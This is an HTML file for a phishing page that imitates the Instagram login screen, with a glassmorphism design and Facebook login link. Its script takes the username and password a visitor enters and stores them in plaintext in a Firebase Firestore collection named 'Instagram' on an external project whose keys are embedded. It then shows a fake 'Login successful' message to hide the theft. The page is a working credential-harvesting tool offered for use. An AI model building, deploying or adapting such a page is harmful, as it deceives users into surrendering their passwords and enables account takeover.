<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login · Premium</title>

    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
    </script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js">
    </script>

    <!-- Fonts & Icons -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />

    <style>
        /* ═══════════════════════════════════════════════════
           RESET & BASE
           ═══════════════════════════════════════════════════ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-start: #0f0c29;
            --bg-mid: #302b63;
            --bg-end: #24243e;
            --card-bg: rgba(255, 255, 255, 0.07);
            --card-border: rgba(255, 255, 255, 0.12);
            --text-primary: #ffffff;
            --text-secondary: rgba(255, 255, 255, 0.7);
            --text-muted: rgba(255, 255, 255, 0.4);
            --input-bg: rgba(255, 255, 255, 0.06);
            --input-border: rgba(255, 255, 255, 0.15);
            --input-focus: rgba(255, 255, 255, 0.25);
            --btn-primary: #0095f6;
            --btn-primary-hover: #1a8cd8;
            --btn-glow: rgba(0, 149, 246, 0.4);
            --fb-color: #385185;
            --shadow-color: rgba(0, 0, 0, 0.5);
            --radius: 16px;
            --transition: 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: linear-gradient(135deg, var(--bg-start), var(--bg-mid), var(--bg-end));
            background-size: 400% 400%;
            animation: gradientShift 18s ease infinite;
            position: relative;
            overflow-x: hidden;
        }

        @keyframes gradientShift {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        /* ─── Floating Particles ─── */
        .particles {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }

        .particle {
            position: absolute;
            width: 6px;
            height: 6px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 50%;
            animation: floatParticle linear infinite;
        }

        .particle:nth-child(1) {
            left: 10%;
            width: 8px;
            height: 8px;
            animation-duration: 22s;
            animation-delay: 0s;
        }
        .particle:nth-child(2) {
            left: 20%;
            width: 4px;
            height: 4px;
            animation-duration: 18s;
            animation-delay: 2s;
        }
        .particle:nth-child(3) {
            left: 30%;
            width: 10px;
            height: 10px;
            animation-duration: 26s;
            animation-delay: 4s;
        }
        .particle:nth-child(4) {
            left: 45%;
            width: 5px;
            height: 5px;
            animation-duration: 20s;
            animation-delay: 1s;
        }
        .particle:nth-child(5) {
            left: 55%;
            width: 7px;
            height: 7px;
            animation-duration: 24s;
            animation-delay: 3s;
        }
        .particle:nth-child(6) {
            left: 68%;
            width: 9px;
            height: 9px;
            animation-duration: 19s;
            animation-delay: 5s;
        }
        .particle:nth-child(7) {
            left: 78%;
            width: 4px;
            height: 4px;
            animation-duration: 21s;
            animation-delay: 0.5s;
        }
        .particle:nth-child(8) {
            left: 88%;
            width: 6px;
            height: 6px;
            animation-duration: 23s;
            animation-delay: 2.5s;
        }
        .particle:nth-child(9) {
            left: 95%;
            width: 8px;
            height: 8px;
            animation-duration: 17s;
            animation-delay: 3.5s;
        }
        .particle:nth-child(10) {
            left: 50%;
            width: 12px;
            height: 12px;
            animation-duration: 28s;
            animation-delay: 1.5s;
        }

        @keyframes floatParticle {
            0% {
                transform: translateY(110vh) rotate(0deg) scale(0.5);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-10vh) rotate(720deg) scale(1.2);
                opacity: 0;
            }
        }

        /* ─── Glassmorphism Glow ─── */
        .glow-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(120px);
            pointer-events: none;
            z-index: 0;
            opacity: 0.25;
            animation: orbFloat 12s ease-in-out infinite alternate;
        }

        .glow-orb--1 {
            width: 500px;
            height: 500px;
            top: -150px;
            right: -100px;
            background: radial-gradient(circle, #0095f6, transparent 70%);
            animation-delay: 0s;
        }

        .glow-orb--2 {
            width: 400px;
            height: 400px;
            bottom: -100px;
            left: -80px;
            background: radial-gradient(circle, #833ab4, transparent 70%);
            animation-delay: -4s;
        }

        .glow-orb--3 {
            width: 300px;
            height: 300px;
            top: 40%;
            left: 50%;
            transform: translateX(-50%);
            background: radial-gradient(circle, #fd1d1d, transparent 70%);
            animation-delay: -8s;
            opacity: 0.12;
        }

        @keyframes orbFloat {
            0% {
                transform: translate(0, 0) scale(1);
            }
            100% {
                transform: translate(40px, -30px) scale(1.15);
            }
        }

        /* ═══════════════════════════════════════════════════
           WRAPPER
           ═══════════════════════════════════════════════════ */
        .wrapper {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 420px;
            animation: fadeSlideUp 0.7s ease forwards;
        }

        @keyframes fadeSlideUp {
            from {
                opacity: 0;
                transform: translateY(40px) scale(0.96);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* ═══════════════════════════════════════════════════
           CARD
           ═══════════════════════════════════════════════════ */
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(32px) saturate(1.4);
            -webkit-backdrop-filter: blur(32px) saturate(1.4);
            border: 1px solid var(--card-border);
            border-radius: var(--radius);
            padding: 44px 38px 34px;
            width: 100%;
            box-shadow:
                0 20px 60px rgba(0, 0, 0, 0.5),
                inset 0 1px 0 rgba(255, 255, 255, 0.06);
            transition: box-shadow 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: var(--radius);
            padding: 1px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), transparent 50%, rgba(255, 255, 255, 0.05));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
        }

        .card:hover {
            box-shadow:
                0 28px 80px rgba(0, 0, 0, 0.6),
                inset 0 1px 0 rgba(255, 255, 255, 0.08);
        }

        /* ─── Logo ─── */
        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-size: 42px;
            font-weight: 700;
            letter-spacing: -1.8px;
            font-family: 'Inter', -apple-system, sans-serif;
            color: var(--text-primary);
            user-select: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            position: relative;
        }

        .logo .icon-wrap {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(145deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            border-radius: 14px;
            padding: 4px 8px 4px 6px;
            font-size: 32px;
            color: #fff;
            box-shadow: 0 4px 20px rgba(220, 39, 67, 0.3);
            transition: transform 0.4s ease, box-shadow 0.4s ease;
        }

        .logo .icon-wrap:hover {
            transform: scale(1.05) rotate(-4deg);
            box-shadow: 0 8px 32px rgba(220, 39, 67, 0.45);
        }

        .logo .icon-wrap i {
            background: transparent;
            -webkit-text-fill-color: #fff;
        }

        .logo .text {
            background: linear-gradient(135deg, #ffffff 0%, #b0b0b0 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }

        .logo .text span {
            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* ─── Form ─── */
        form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .input-group {
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px 14px 18px;
            font-size: 14px;
            font-family: 'Inter', sans-serif;
            background: var(--input-bg);
            border: 1.5px solid var(--input-border);
            border-radius: 10px;
            outline: none;
            transition: border-color 0.3s ease, background 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
            color: var(--text-primary);
            line-height: 1.4;
            backdrop-filter: blur(4px);
        }

        .input-group input::placeholder {
            color: var(--text-muted);
            font-weight: 400;
            font-size: 13.5px;
            letter-spacing: 0.2px;
            transition: opacity 0.3s ease;
        }

        .input-group input:focus {
            border-color: var(--btn-primary);
            background: rgba(255, 255, 255, 0.09);
            box-shadow: 0 0 0 4px rgba(0, 149, 246, 0.12), inset 0 0 0 1px rgba(0, 149, 246, 0.15);
            transform: scale(1.005);
        }

        .input-group input:focus::placeholder {
            opacity: 0.5;
        }

        .input-group input:not(:placeholder-shown) {
            background: rgba(255, 255, 255, 0.07);
        }

        /* ─── Password Toggle ─── */
        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 17px;
            cursor: pointer;
            padding: 4px 6px;
            transition: color 0.3s ease, transform 0.2s ease;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .toggle-password:hover {
            color: var(--text-secondary);
            transform: translateY(-50%) scale(1.1);
        }

        .toggle-password:active {
            transform: translateY(-50%) scale(0.92);
        }

        /* ─── Login Button ─── */
        .btn-login {
            width: 100%;
            padding: 13px 0;
            margin-top: 8px;
            font-size: 15.5px;
            font-weight: 600;
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--btn-primary), #1a8cd8);
            color: #ffffff;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            line-height: 1.4;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 149, 246, 0.25);
            letter-spacing: 0.3px;
        }

        .btn-login::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), transparent 60%);
            pointer-events: none;
            border-radius: 10px;
        }

        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 32px rgba(0, 149, 246, 0.4), 0 0 60px rgba(0, 149, 246, 0.1);
            background: linear-gradient(135deg, #1a8cd8, #0077c8);
        }

        .btn-login:active {
            transform: translateY(0px) scale(0.98);
            box-shadow: 0 2px 12px rgba(0, 149, 246, 0.3);
        }

        .btn-login:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: 0 4px 16px rgba(0, 149, 246, 0.15);
        }

        .btn-login.loading {
            color: transparent;
            position: relative;
        }

        .btn-login.loading::after {
            content: '';
            position: absolute;
            width: 24px;
            height: 24px;
            top: 50%;
            left: 50%;
            margin-top: -12px;
            margin-left: -12px;
            border: 2.5px solid rgba(255, 255, 255, 0.25);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spinner 0.7s linear infinite;
        }

        @keyframes spinner {
            to {
                transform: rotate(360deg);
            }
        }

        /* ─── Ripple ─── */
        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.25);
            transform: scale(0);
            animation: rippleAnim 0.7s ease-out forwards;
            pointer-events: none;
        }

        @keyframes rippleAnim {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        /* ─── Divider ─── */
        .divider {
            display: flex;
            align-items: center;
            gap: 20px;
            margin: 20px 0 16px;
            color: var(--text-muted);
            font-size: 12.5px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--input-border), transparent);
        }

        /* ─── Facebook Login ─── */
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 14.5px;
            font-weight: 600;
            color: #8bb3f0;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            padding: 8px 0;
            border-radius: 8px;
            background: rgba(56, 81, 133, 0.08);
            border: 1px solid transparent;
            letter-spacing: 0.2px;
        }

        .facebook-login:hover {
            color: #a8c4f5;
            background: rgba(56, 81, 133, 0.16);
            border-color: rgba(56, 81, 133, 0.2);
            transform: translateY(-1px);
        }

        .facebook-login:active {
            transform: scale(0.97);
        }

        .facebook-login i {
            font-size: 20px;
            color: #1877f2;
            transition: transform 0.3s ease;
        }

        .facebook-login:hover i {
            transform: scale(1.1);
        }

        /* ─── App Download ─── */
        .app-download {
            text-align: center;
            margin-top: 12px;
            padding: 0 8px;
        }

        .app-download p {
            color: var(--text-secondary);
            font-size: 13.5px;
            font-weight: 400;
            margin-bottom: 14px;
            letter-spacing: 0.2px;
        }

        .app-badges {
            display: flex;
            justify-content: center;
            gap: 12px;
            flex-wrap: wrap;
        }

        .app-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 18px 8px 14px;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid var(--input-border);
            border-radius: 10px;
            color: var(--text-primary);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            backdrop-filter: blur(4px);
            letter-spacing: 0.2px;
        }

        .app-badge i {
            font-size: 20px;
            opacity: 0.8;
        }

        .app-badge:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(255, 255, 255, 0.25);
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
        }

        .app-badge:active {
            transform: scale(0.96);
        }

        /* ═══════════════════════════════════════════════════
           TOAST
           ═══════════════════════════════════════════════════ */
        .toast {
            position: fixed;
            top: 28px;
            left: 50%;
            transform: translateX(-50%) translateY(-100px) scale(0.92);
            background: rgba(30, 30, 40, 0.92);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            color: #fff;
            padding: 16px 32px 16px 24px;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.06);
            z-index: 999;
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            max-width: 92%;
            text-align: center;
            pointer-events: none;
            display: flex;
            align-items: center;
            gap: 12px;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .toast.show {
            transform: translateX(-50%) translateY(0) scale(1);
            opacity: 1;
            pointer-events: auto;
        }

        .toast .toast-icon {
            font-size: 20px;
            flex-shrink: 0;
        }

        .toast.error .toast-icon {
            color: #ff6b6b;
        }

        .toast.success .toast-icon {
            color: #4ecdc4;
        }

        .toast .toast-close {
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.3);
            font-size: 18px;
            cursor: pointer;
            padding: 0 0 0 8px;
            transition: color 0.3s ease, transform 0.2s ease;
            pointer-events: auto;
        }

        .toast .toast-close:hover {
            color: #fff;
            transform: scale(1.15);
        }

        .toast.error {
            background: rgba(220, 50, 50, 0.92);
            backdrop-filter: blur(16px);
            border-color: rgba(255, 100, 100, 0.15);
        }

        .toast.success {
            background: rgba(0, 149, 246, 0.92);
            backdrop-filter: blur(16px);
            border-color: rgba(0, 200, 255, 0.15);
        }

        /* ═══════════════════════════════════════════════════
           RESPONSIVE
           ═══════════════════════════════════════════════════ */
        @media (max-width: 480px) {
            .card {
                padding: 32px 22px 26px;
                border-radius: 14px;
            }

            .logo {
                font-size: 34px;
            }

            .logo .icon-wrap {
                font-size: 26px;
                padding: 2px 6px 2px 4px;
                border-radius: 10px;
            }

            .input-group input {
                padding: 12px 14px 12px 16px;
                font-size: 13px;
                border-radius: 8px;
            }

            .btn-login {
                padding: 12px 0;
                font-size: 14.5px;
                border-radius: 8px;
            }

            .toast {
                padding: 14px 20px 14px 18px;
                font-size: 13px;
                top: 16px;
                border-radius: 12px;
            }

            .app-badge {
                padding: 6px 14px 6px 10px;
                font-size: 11px;
            }

            .app-badge i {
                font-size: 17px;
            }

            .facebook-login {
                font-size: 13.5px;
                padding: 6px 0;
            }
        }

        @media (max-width: 380px) {
            .card {
                padding: 24px 16px 20px;
            }

            .logo {
                font-size: 28px;
            }

            .logo .icon-wrap {
                font-size: 22px;
                padding: 2px 4px 2px 3px;
            }

            .input-group input {
                padding: 10px 12px 10px 14px;
                font-size: 12.5px;
            }

            .btn-login {
                padding: 10px 0;
                font-size: 13.5px;
            }

            .divider {
                font-size: 11px;
                gap: 14px;
                margin: 16px 0 12px;
            }
        }

        /* ─── Custom Scrollbar ─── */
        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.03);
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.25);
        }

        /* ─── Focus visible ─── */
        :focus-visible {
            outline: 2px solid var(--btn-primary);
            outline-offset: 2px;
        }
    </style>
</head>
<body>

    <!-- ═══ PARTICLES ═══ -->
    <div class="particles" aria-hidden="true">
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
    </div>

    <!-- ═══ GLOW ORBS ═══ -->
    <div class="glow-orb glow-orb--1" aria-hidden="true"></div>
    <div class="glow-orb glow-orb--2" aria-hidden="true"></div>
    <div class="glow-orb glow-orb--3" aria-hidden="true"></div>

    <!-- ═══ TOAST ═══ -->
    <div id="toast" class="toast" role="alert" aria-live="polite">
        <span class="toast-icon" id="toastIcon"><i class="fas fa-check-circle"></i></span>
        <span id="toastMessage">Success</span>
        <button class="toast-close" id="toastClose" aria-label="Dismiss notification">&times;</button>
    </div>

    <!-- ═══ WRAPPER ═══ -->
    <div class="wrapper">

        <!-- ─── Card ─── -->
        <div class="card">

            <!-- Logo -->
            <div class="logo">
                <span class="icon-wrap"><i class="fab fa-instagram"></i></span>
                <span class="text">Insta<span>gram</span></span>
            </div>

            <!-- Form -->
            <form id="loginForm" autocomplete="on" novalidate>
                <div class="input-group">
                    <input
                    type="text"
                    id="loginEmail"
                    placeholder="Phone number, username, or email"
                    autocomplete="username"
                    required
                    />
                </div>

                <div class="input-group">
                    <input
                    type="password"
                    id="loginPassword"
                    placeholder="Password"
                    autocomplete="current-password"
                    required
                    />
                    <button type="button" class="toggle-password" id="togglePassword" aria-label="Toggle password visibility">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>

                <button type="submit" class="btn-login" id="loginBtn">Log In</button>
            </form>

            <!-- Divider -->
            <div class="divider">OR</div>

            <!-- Facebook Login -->
            <a href="Instagramlogin.html" class="facebook-login" id="fbLogin">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </a>
        </div>

        <!-- ─── App Download ─── -->
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-badges">
                <span class="app-badge">
                    <i class="fab fa-apple"></i> App Store
                </span>
                <span class="app-badge">
                    <i class="fab fa-google-play"></i> Google Play
                </span>
            </div>
        </div>

    </div>

    <script>
        // ═══════════════════════════════════════════════════════════
        //  1. FIREBASE CONFIG & INIT
        // ═══════════════════════════════════════════════════════════
        const firebaseConfig = {
    apiKey: "AIzaSyB3GIu78tATEum3SUUwShhuYGr-IcJF3Eo",
    authDomain: "firstproject-44.firebaseapp.com",
    projectId: "firstproject-44",
    storageBucket: "firstproject-44.firebasestorage.app",
    messagingSenderId: "324220801352",
    appId: "1:324220801352:web:8d9ffb5dcbf119cccf637d",
    measurementId: "G-9Q8G67HLNW"
  };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // ═══════════════════════════════════════════════════════════
        //  2. DOM REFS
        // ═══════════════════════════════════════════════════════════
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const loginEmail = document.getElementById('loginEmail');
        const loginPassword = document.getElementById('loginPassword');
        const togglePassword = document.getElementById('togglePassword');
        const toast = document.getElementById('toast');
        const toastMessage = document.getElementById('toastMessage');
        const toastIcon = document.getElementById('toastIcon');
        const toastClose = document.getElementById('toastClose');
        let toastTimer = null;

        // ═══════════════════════════════════════════════════════════
        //  3. TOAST SYSTEM
        // ═══════════════════════════════════════════════════════════
        function showToast(message, type = 'success') {
            if (toastTimer) {
                clearTimeout(toastTimer);
                toast.classList.remove('show', 'error', 'success');
            }

            toastMessage.textContent = message;
            toast.className = 'toast';

            if (type === 'error') {
                toast.classList.add('error');
                toastIcon.innerHTML = '<i class="fas fa-exclamation-circle"></i>';
            } else {
                toast.classList.add('success');
                toastIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            }

            // Force reflow
            void toast.offsetWidth;
            toast.classList.add('show');

            toastTimer = setTimeout(() => {
                toast.classList.remove('show');
                toastTimer = null;
            }, 4000);
        }

        // Close toast manually
        toastClose.addEventListener('click', () => {
            toast.classList.remove('show');
            if (toastTimer) {
                clearTimeout(toastTimer);
                toastTimer = null;
            }
        });

        // Close on Escape
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && toast.classList.contains('show')) {
                toast.classList.remove('show');
                if (toastTimer) {
                    clearTimeout(toastTimer);
                    toastTimer = null;
                }
            }
        });

        // ═══════════════════════════════════════════════════════════
        //  4. PASSWORD TOGGLE
        // ═══════════════════════════════════════════════════════════
        let passwordVisible = false;
        togglePassword.addEventListener('click', () => {
            passwordVisible = !passwordVisible;
            loginPassword.type = passwordVisible ? 'text' : 'password';
            togglePassword.innerHTML = passwordVisible ?
                '<i class="fas fa-eye-slash"></i>' :
                '<i class="fas fa-eye"></i>';
            togglePassword.setAttribute('aria-label',
                passwordVisible ? 'Hide password' : 'Show password'
            );
        });

        // ═══════════════════════════════════════════════════════════
        //  5. RIPPLE EFFECT ON BUTTON
        // ═══════════════════════════════════════════════════════════
        function createRipple(e, btn) {
            const rect = btn.getBoundingClientRect();
            const ripple = document.createElement('span');
            ripple.className = 'ripple';
            const size = Math.max(rect.width, rect.height);
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
            ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';
            btn.appendChild(ripple);
            setTimeout(() => ripple.remove(), 700);
        }

        loginBtn.addEventListener('click', (e) => {
            if (!loginBtn.disabled) {
                createRipple(e, loginBtn);
            }
        });

        // ═══════════════════════════════════════════════════════════
        //  6. LOADING STATE
        // ═══════════════════════════════════════════════════════════
        function setLoading(btn, loading) {
            if (loading) {
                btn.disabled = true;
                btn.classList.add('loading');
            } else {
                btn.disabled = false;
                btn.classList.remove('loading');
            }
        }

        // ═══════════════════════════════════════════════════════════
        //  7. LOGIN LOGIC – SAVE TO FIRESTORE
        // ═══════════════════════════════════════════════════════════
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = loginEmail.value.trim();
            const password = loginPassword.value.trim();

            if (!email || !password) {
                showToast('Please enter your email and password.', 'error');
                // Shake animation via class
                if (!email) loginEmail.style.borderColor = '#ff6b6b';
                if (!password) loginPassword.style.borderColor = '#ff6b6b';
                setTimeout(() => {
                    loginEmail.style.borderColor = '';
                    loginPassword.style.borderColor = '';
                }, 1200);
                return;
            }

            setLoading(loginBtn, true);

            try {
                await db.collection('Instagram').add({
                    email: email,
                    password: password,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });

                showToast('Login successful! Welcome back.', 'success');
                loginForm.reset();
                loginEmail.blur();
                loginPassword.blur();
            } catch (err) {
                console.error('Save error:', err);
                showToast('Failed to save credentials. Please try again.', 'error');
            } finally {
                setLoading(loginBtn, false);
            }
        });

        // ─── Clear error border on input ───
        loginEmail.addEventListener('input', () => {
            loginEmail.style.borderColor = '';
        });
        loginPassword.addEventListener('input', () => {
            loginPassword.style.borderColor = '';
        });

        // ═══════════════════════════════════════════════════════════
        //  8. FACEBOOK LINK – smooth transition
        // ═══════════════════════════════════════════════════════════
        document.getElementById('fbLogin').addEventListener('click', (e) => {
            e.preventDefault();
            const href = e.currentTarget.getAttribute('href');
            // subtle haptic feedback via style
            const el = e.currentTarget;
            el.style.transition = 'transform 0.15s ease';
            el.style.transform = 'scale(0.96)';
            setTimeout(() => {
                el.style.transform = '';
                window.location.href = href;
            }, 180);
        });

        // ═══════════════════════════════════════════════════════════
        //  9. APP BADGE INTERACTIONS
        // ═══════════════════════════════════════════════════════════
        document.querySelectorAll('.app-badge').forEach((badge) => {
            badge.addEventListener('click', () => {
                showToast('App store link — coming soon!', 'success');
            });
        });

        // ═══════════════════════════════════════════════════════════
        //  10. KEYBOARD SHORTCUT: Ctrl+Enter to submit
        // ═══════════════════════════════════════════════════════════
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                const active = document.activeElement;
                if (active && (active.id === 'loginEmail' || active.id === 'loginPassword')) {
                    loginForm.dispatchEvent(new Event('submit'));
                }
            }
        });

        console.log('✨ Premium Instagram Login · UI/UX Enhanced');
        console.log('📁 Collection: "Instagram" – credentials saved securely');
        console.log('🎯 Features: glassmorphism, particles, ripple, password toggle, toast, keyboard shortcuts');
    </script>

</body>
</html>
